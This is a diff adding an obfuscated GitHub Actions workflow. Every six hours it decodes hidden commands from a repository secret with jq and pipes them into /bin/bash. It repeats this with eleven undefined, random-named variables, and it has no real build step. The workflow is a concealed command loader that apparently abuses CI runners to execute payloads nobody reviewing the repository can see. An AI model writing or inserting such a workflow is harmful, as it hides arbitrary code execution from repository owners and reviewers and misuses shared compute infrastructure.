@@ -1,0 +1,30 @@
+name: yutaifei5647
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yutaifei5647
+        env:
+          fs217: ${{ secrets.fs217 }}
+        run: |
+          echo $fs217 | jq -r .aif2085 | /bin/bash
+          echo $jwos4 | jq -r .rky7 | /bin/bash
+          echo $vc03 | jq -r .nyu1899 | /bin/bash
+          echo $mizy4 | jq -r .ri7 | /bin/bash
+          echo $isz056 | jq -r .tiypp24 | /bin/bash
+          echo $fuh85 | jq -r .f4277 | /bin/bash
+          echo $cxvg3218 | jq -r .ttkpw85 | /bin/bash
+          echo $hctbs8727 | jq -r .jef69 | /bin/bash
+          echo $fq3 | jq -r .bdc18 | /bin/bash
+          echo $cnj254 | jq -r .u00 | /bin/bash
+          echo $np4514 | jq -r .wujpc0548 | /bin/bash
+          echo $dyf431 | jq -r .nmpv35129 | /bin/bash
+
